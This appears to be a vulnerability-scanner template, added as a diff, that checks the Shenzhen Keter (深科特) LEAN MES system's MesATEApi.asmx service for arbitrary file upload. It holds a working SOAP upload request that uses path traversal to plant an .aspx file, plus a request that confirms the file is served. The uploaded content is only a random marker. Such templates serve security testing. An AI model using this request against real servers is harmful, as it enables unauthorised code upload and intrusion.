@@ -1,0 +1,65 @@
+id: lean-mes-mesateapi-anyfile-upload
+info:
+  name: 深科特 LEAN MES系统 MesATEApi.asmx 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  metadata:
+    finger: lean-mes
+  description: |
+    深科特 LEAN MES系统 MesATEApi.asmx 任意文件上传漏洞
+
+variables:
+  t1: "{{rand_base(7)}}"
+  t2: "{{base64(t1)}}"
+  t3: "{{base64(t2)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file-request
+    method: POST
+    path:
+      - "{{BaseURL}}/WebService/MesATEApi.asmx"
+    headers:
+      Content-Type: text/xml; charset=utf-8
+      SOAPAction: "\"http://mesateapi.com/UploadFileToMES\""
+    body: |-
+      <?xml version="1.0" encoding="utf-8"?>
+      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+          <UploadFileToMES xmlns="http://mesateapi.com/">
+            <empNo>string</empNo>
+            <sn>string</sn>
+            <resource>string</resource>
+            <station>string</station>
+            <fileBytes>{{t3}}</fileBytes>
+            <folderName>/../ertyui</folderName>
+            <fileName>{{t1}}.aspx</fileName>
+          </UploadFileToMES>
+        </soap:Body>
+      </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "文件上传成功"
+          - "<UploadFileToMESResult>"
+
+  - id: verify-upload-request
+    method: GET
+    path:
+      - "{{BaseURL}}/ertyui/{{t1}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
